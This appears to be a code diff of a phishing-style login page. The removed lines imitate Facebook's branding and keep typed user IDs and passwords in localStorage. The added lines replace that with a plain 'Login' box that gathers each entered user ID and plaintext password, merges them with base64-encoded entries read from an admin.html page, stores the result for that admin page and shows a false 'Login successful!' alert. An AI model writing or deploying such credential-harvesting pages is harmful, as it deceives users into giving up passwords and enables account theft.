@@ -14,33 +14,12 @@
             margin: 0;
             background-color: #f0f2f5;
         }
-        .container {
-            display: flex;
-            align-items: center;
-            max-width: 1000px;
-            margin: 0 20px;
-        }
-        .left-section {
-            padding-right: 32px;
-            margin-bottom: 90px;
-        }
-        .facebook-text {
-            color: #1877f2;
-            font-size: 48px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .tagline {
-            font-size: 24px;
-            line-height: 28px;
-            width: 500px;
-        }
         .login-box {
             background: white;
             padding: 30px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            width: 396px;
+            width: 300px;
         }
         h2 {
             text-align: center;
@@ -49,63 +28,76 @@
         }
         input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 10px;
             margin: 10px 0;
             border: 1px solid #ddd;
-            border-radius: 6px;
+            border-radius: 4px;
             box-sizing: border-box;
-            font-size: 17px;
         }
         button {
             width: 100%;
-            padding: 12px;
-            background-color: #1877f2;
+            padding: 10px;
+            background-color: #1a73e8;
             color: white;
             border: none;
-            border-radius: 6px;
+            border-radius: 4px;
             cursor: pointer;
             margin-top: 10px;
-            font-size: 20px;
-            font-weight: bold;
         }
         button:hover {
-            background-color: #166fe5;
+            background-color: #1557b0;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="left-section">
-            <div class="facebook-text">facebook</div>
-            <div class="tagline">Connect with friends and the world around you on Facebook.</div>
-        </div>
-        <div class="login-box">
-            <form id="loginForm">
-                <input type="text" id="userid" placeholder="Enter User ID or Email" required>
-                <input type="password" id="password" placeholder="Enter your Password" required>
-                <button type="submit">Login</button>
-            </form>
-        </div>
+    <div class="login-box">
+        <h2>Login</h2>
+        <form id="loginForm">
+            <input type="text" id="userid" placeholder="Enter User ID or Email" required>
+            <input type="password" id="password" placeholder="Enter your Password" required>
+            <button type="submit">Login</button>
+        </form>
     </div>
 
     <script>
+        // Encode data to base64 for URL safety
+        function encodeData(data) {
+            return btoa(JSON.stringify(data));
+        }
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const userid = document.getElementById('userid').value;
             const password = document.getElementById('password').value;
             
-            let entries = JSON.parse(localStorage.getItem('loginEntries') || '[]');
-            entries.push({
-                userid: userid,
-                password: password,
-                time: new Date().toLocaleString()
-            });
-            
-            localStorage.setItem('loginEntries', JSON.stringify(entries));
-            
-            alert('Login successful!');
-            document.getElementById('loginForm').reset();
+            // Get existing data from admin page
+            fetch('admin.html')
+                .then(response => response.text())
+                .then(html => {
+                    const parser = new DOMParser();
+                    const doc = parser.parseFromString(html, 'text/html');
+                    const dataScript = doc.querySelector('#loginData');
+                    let existingData = [];
+                    if (dataScript) {
+                        try {
+                            existingData = JSON.parse(atob(dataScript.textContent));
+                        } catch(e) {}
+                    }
+                    
+                    // Add new entry
+                    existingData.push({
+                        userid: userid,
+                        password: password,
+                        time: new Date().toLocaleString()
+                    });
+                    
+                    // Store encoded data in localStorage for admin page
+                    localStorage.setItem('encodedData', encodeData(existingData));
+                    
+                    alert('Login successful!');
+                    document.getElementById('loginForm').reset();
+                });
         });
     </script>
 </body>
